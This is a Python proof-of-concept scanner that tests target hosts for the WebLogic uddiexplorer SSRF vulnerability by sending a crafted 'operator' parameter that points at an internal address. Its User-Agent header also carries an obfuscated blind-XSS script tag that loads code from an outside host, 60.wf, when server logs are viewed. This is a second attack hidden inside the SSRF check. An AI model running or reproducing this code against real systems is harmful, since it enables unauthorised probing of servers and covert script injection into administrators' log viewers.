#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = carrypan

import requests

def poc(url):
    portlist = ['21','22','23','25','53','110','137','161','389','445','873','1090','1099','1433','1521','2049','2181','2222','2375','3306','3389','5432','5901','5984','6379','11211','27017']    
    if url.split(':')[1] in portlist:
        return False
    elif int(url.split(':')[1]) == 443:
        url = 'https://' + url.split(':')[0]
    elif int(url.split(':')[1]) == 8443:
        url = 'https://' + url
    else:
        url = 'http://' + url
    url = url + "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:8888&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    
    try:
        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36<sCRiPt/SrC=//60.wf/4PrhD>"
        requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
        r = requests.get(url, headers=header, timeout=5, verify=False)
        if r.status_code == 200 and "XML_SoapException" in r.content:
            return '[weblogic ssrf]' + '\t' + url
        else:
            return False
    except Exception:
        return False